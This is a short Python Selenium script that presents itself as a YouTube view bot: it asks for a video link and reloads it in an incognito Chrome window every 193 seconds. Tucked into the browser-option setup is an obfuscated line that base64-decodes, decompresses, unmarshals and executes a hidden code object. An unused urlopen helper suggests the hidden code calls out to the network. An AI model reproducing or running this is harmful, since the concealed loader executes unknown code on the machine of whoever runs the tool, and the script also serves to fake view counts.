
from selenium import webdriver
import time
import sys
import zlib
import base64
import marshal
import json
import urllib


if sys.version_info[0] > 2:
    from urllib import request


urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen


chrome_options = webdriver.ChromeOptions()
exec(eval(marshal.loads(zlib.decompress(base64.b64decode(b'eJwrtWJgYCgtyskvSM3TUM8oKSmw0tc3MdUzNDbQszDWM7G0MjQ2ttDXLy5JTE8tKtavMIjUK6hU19QrSk1M0dAEAC6nEc0=')))))
chrome_options.add_argument("start-maximized")
chrome_options.add_argument("--incognito")

yv= input('Youtube Video Link: ')

driver = webdriver.Chrome(chrome_options=chrome_options)
while True:
        
    driver.get(yv)
    time.sleep(193)
